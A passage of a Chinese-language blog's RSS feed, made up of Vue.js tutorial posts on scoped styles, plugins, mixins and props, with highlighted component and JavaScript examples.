</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">demo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">skyblue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>使用了<code>scoped</code>之后，<code>SiteUser</code>和<code>SiteUser</code>中的<code>.demo</code>样式就不会互相冲突。因为它们的<code>.demo</code>仅作用于当前<code>.vue</code>文件的模板中，不会作用于其它组件，对其它组件造成影响。</p>
<blockquote>
<p>注：</p>
<p>一般不会在<code>App.vue</code>中使用<code>scoped</code>样式。因为<code>App.vue</code>管理着整个项目中所有的组件。所以在<code>App.vue</code>中定义的样式一般是要全局生效的样式。如果在<code>App.vue</code>中使用<code>scoped</code>，那么<code>App.vue</code>中的样式只会对<code>App.vue</code>中的非组件元素生效。</p>
<p>也就是说，<u>使用了<code>scoped</code>的组件，其样式<strong>一般</strong>不会对子组件生效</u>。</p>
</blockquote>
<hr>
<h1 id="scoped-原理" data-numberify>Scoped 原理<a class="anchor ms-1" href="#scoped-原理"></a></h1>
<p>使用了<code>scoped</code>的组件，Vue会在其真实DOM中的所有非组件元素上添加一个随机的、以<code>data-v-</code>为开头的属性（子组件只会在其根元素上添加这个<code>data-v-</code>属性）。然后Vue会对该组件的所有样式都加上一个属性选择器，例如<code>.demo[data-v-xxxxxxxx]</code>。如此一来，使用了<code>scoped</code>的组件，它们的样式不会被作用到其它元素上。</p>
<p>以上例中的两个组件为例，在<code>App.vue</code>使用它们，并且使用<code>scoped</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  App.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">MySite</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">SiteUser</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">import</span> <span class="nx">MySite</span> <span class="nx">from</span> <span class="s1">&#39;./components/MySite.vue&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">import</span> <span class="nx">SiteUser</span> <span class="nx">from</span> <span class="s1">&#39;./components/SiteUser.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello!&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">SiteUser</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">MySite</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">demo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">color</span><span class="p">:</span> <span class="kc">red</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  SiteUser.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>用户姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span> <span class="c">&lt;!-- App.vue 中的 .title 不会对其生效 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在浏览器中，生成的真实DOM可能是这样的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>Hello!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">data-v-2fxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">data-v-2fxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>网站名称：Linner&#39;s Blog<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">data-v-2fxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>网站地址：blog.linner.asia<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">data-v-5axxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">data-v-7bxxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">data-v-5axxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>用户姓名：张三<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">data-v-5axxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>用户年龄：21<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">data-v-5axxxxxx</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>用户性别：男<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 插件</title>
      <link>/docs/vue/plugins/</link>
      <pubDate>Mon, 18 Sep 2023 01:48:20 +0000</pubDate>
      
      <guid>/docs/vue/plugins/</guid>
      <description><![CDATA[Vue插件主要用于增强Vue。 定义插件 在Vue中，插件的本质是一个包含install()方法的对象。 install()方法： 参数1：Vue原]]></description>
      <content:encoded><![CDATA[<p>Vue插件主要用于增强Vue。</p>
<hr>
<h1 id="定义插件" data-numberify>定义插件<a class="anchor ms-1" href="#定义插件"></a></h1>
<p>在Vue中，插件的本质是一个包含<code>install()</code>方法的对象。</p>
<p><code>install()</code>方法：</p>
<ol>
<li>参数1：Vue原型对象.</li>
<li>参数2 ~ n：第二个参数开始之后的参数（包括第二个）是插件使用者传递的数据。</li>
</ol>
<p>定义一个简单的插件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * plugins.js
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Vue 插件
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">myPlugin</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">install</span><span class="p">(</span><span class="nx">Vue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello my plugin!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Vue</span><span class="p">);</span> <span class="c1">// 获取 Vue 原型对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* 
</span></span></span><span class="line"><span class="cl"><span class="cm">      可以在插件中使用 Vue 原型对象定义一些全局的配置
</span></span></span><span class="line"><span class="cl"><span class="cm">      例如定义全局过滤器、全局指令、全局混入，在Vue原型添加方法等等...
</span></span></span><span class="line"><span class="cl"><span class="cm">      甚至可以在插件中启用其它插件
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>接收参数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">plugin</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">install</span><span class="p">(</span><span class="nx">Vue</span><span class="p">,</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h1 id="使用插件" data-numberify>使用插件<a class="anchor ms-1" href="#使用插件"></a></h1>
<p>要使用插件需要以下两个步骤：</p>
<ol>
<li>引入插件。</li>
<li>使用<code>Vue.use()</code>方法使插件生效。</li>
</ol>
<p><code>Vue.use()</code>方法：</p>
<ol>
<li>参数1：要启用的插件的配置对象。</li>
<li>参数2 ~ n：要传递给插件的参数，这些参数会传递给插件的<code>install()</code>中的参数2 ~ n。</li>
</ol>
<p>例如使用上方定义的插件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * main.js
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 引入插件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="p">{</span><span class="nx">myPlugin</span><span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;./plugins&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 使用插件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">myPlugin</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>使用时传入参数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">myPlugin</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 混入配置对象</title>
      <link>/docs/vue/components/mixins/</link>
      <pubDate>Mon, 18 Sep 2023 01:22:04 +0000</pubDate>
      
      <guid>/docs/vue/components/mixins/</guid>
      <description><![CDATA[混入（mixin）是指将多个组件重复的、可共用的配置选项提取成一个混入对象，然后在这些组件中对这些配置选项进行重用。 局部混入 局部混入是指在组]]></description>
      <content:encoded><![CDATA[<p>混入（<code>mixin</code>）是指将多个组件重复的、可共用的配置选项提取成一个混入对象，然后在这些组件中对这些配置选项进行重用。</p>
<hr>
<h1 id="局部混入" data-numberify>局部混入<a class="anchor ms-1" href="#局部混入"></a></h1>
<p>局部混入是指在组件或特定的Vue实例中引入通用的配置对象。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * mixin.js
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 混入配置对象
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 组件中的配置选项基本上都能在 mixin 中使用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">export</span> <span class="kr">const</span> <span class="nx">mixin1</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">showName</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">alert</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello mixin1!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">mixin2</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">x</span><span class="o">:</span> <span class="mi">100</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">y</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello mixin2!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  MySite.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;showName&#34;</span><span class="p">&gt;</span>网站名称：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>网站地址：{{url}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 引入一个混合
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="p">{</span> <span class="nx">mixin1</span><span class="p">,</span> <span class="nx">mixin2</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;../mixin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;MySite&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">x</span><span class="o">:</span> <span class="mi">666</span><span class="p">,</span> <span class="c1">// 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * mixins 中相同的生命周期函数会以被注册的顺序执行
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mixins</span><span class="o">:</span> <span class="p">[</span><span class="nx">mixin1</span><span class="p">,</span> <span class="nx">mixin2</span><span class="p">,],</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * 配置重复的生命周期函数，它们都会被Vue调用
</span></span></span><span class="line"><span class="cl"><span class="cm">   * mixins 中的会先被调用
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello MySite!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="全局混入" data-numberify>全局混入<a class="anchor ms-1" href="#全局混入"></a></h1>
<p>全局混入是指在Vue原型对象中引入通用配置对象，这个配置对象在全局生效，项目中所有的Vue实例和组件都会自动启用该配置。</p>
<p>全局混入使用的是<code>Vue.mixin()</code>方法。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * main.js
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">mixin1</span><span class="p">,</span> <span class="nx">mixin2</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;./mixin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 全局应用 mixin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">mixin</span><span class="p">(</span><span class="nx">mixin1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">mixin</span><span class="p">(</span><span class="nx">mixin2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><hr>
<h1 id="注意事项" data-numberify>注意事项<a class="anchor ms-1" href="#注意事项"></a></h1>
<p>使用<code>mixin</code>时需要注意：</p>
<ul>
<li>组件中的配置选项基本上都能在<code>mixin</code>中使用。</li>
<li>当混入对象和组件中的某些配置（例如<code>data</code>、计算属性、<code>methods</code>）重复时，以组件中的配置为主。</li>
<li>当混入对象和组件中的生命周期函数重复时，它们都会被Vue调用，并且<code>mixins</code>中的生命周期函数会先被Vue调用。</li>
<li>如果<code>mixins</code>中存在相同的生命周期函数，Vue会按照<code>mixin</code>在组件<code>mixins</code>中被注册的顺序进行调用。</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue Props 属性</title>
      <link>/docs/vue/components/props/</link>
      <pubDate>Mon, 18 Sep 2023 01:19:24 +0000</pubDate>
      
      <guid>/docs/vue/components/props/</guid>
      <description><![CDATA[在Vue中，父组件可以往子组件中传递一些属性值。而子组件需要使用props配置项定义这些要从父组件中获取的数据。 使用props配置项，可以让]]></description>
      <content:encoded><![CDATA[<p>在Vue中，父组件可以往子组件中传递一些属性值。而子组件需要使用<code>props</code>配置项定义这些要从父组件中获取的数据。</p>
<p>使用<code>props</code>配置项，可以让该组件的标签在被使用时，通过组件标签属性将值传入组件中。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- SiteUser.vue --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
